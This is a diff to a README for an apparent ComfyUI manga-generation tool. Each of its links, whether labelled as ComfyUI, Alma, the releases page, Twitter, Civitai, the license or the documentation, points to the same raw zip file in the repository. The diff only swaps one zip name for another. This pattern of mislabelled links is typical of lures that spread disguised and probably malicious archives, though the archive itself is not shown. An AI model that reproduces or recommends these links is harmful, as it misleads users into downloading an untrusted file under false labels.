@@ -1,6 +1,6 @@
 # 🎨 comfyui-zimage-skill - Create Stunning Manga and Illustrations
 
-[![Download](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip)
+[![Download](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to ComfyUI Z-Image Skill! This tool allows you to generate beautiful man
 
 Before you can run this application, make sure you have the following:
 
-- **ComfyUI**: You need to have ComfyUI running locally or on your server. You can download it from [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
-- **Alma**: This application requires Alma, which can be accessed from [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
+- **ComfyUI**: You need to have ComfyUI running locally or on your server. You can download it from [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip).
+- **Alma**: This application requires Alma, which can be accessed from [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip).
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the application, go to the [Releases page](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
+1. **Visit the Releases Page**: To download the application, go to the [Releases page](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip).
   
 2. **Select the Latest Release**: Look for the newest version at the top of the page. Click on it to view available downloads.
 
@@ -55,15 +55,15 @@ If you run into issues:
 
 ## 📞 Support
 
-For any questions or feedback, feel free to reach out via Twitter: [@norsizu](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip). You can also explore more on [Civitai](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
+For any questions or feedback, feel free to reach out via Twitter: [@norsizu](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip). You can also explore more on [Civitai](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip).
 
 ## 📄 License
 
-This project is licensed under the MIT License. You can view the full license [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip).
+This project is licensed under the MIT License. You can view the full license [here](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip).
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip)
-- [ComfyUI Documentation](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip)
+- [GitHub Repository](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip)
+- [ComfyUI Documentation](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip)
 
-[![Download](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/zimage-skill-comfyui-1.6.zip)
+[![Download](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip%20Now-Get%20Latest%20Release-blue)](https://github.com/Monggiiiii/comfyui-zimage-skill/raw/refs/heads/main/data/skill-zimage-comfyui-v2.7.zip)
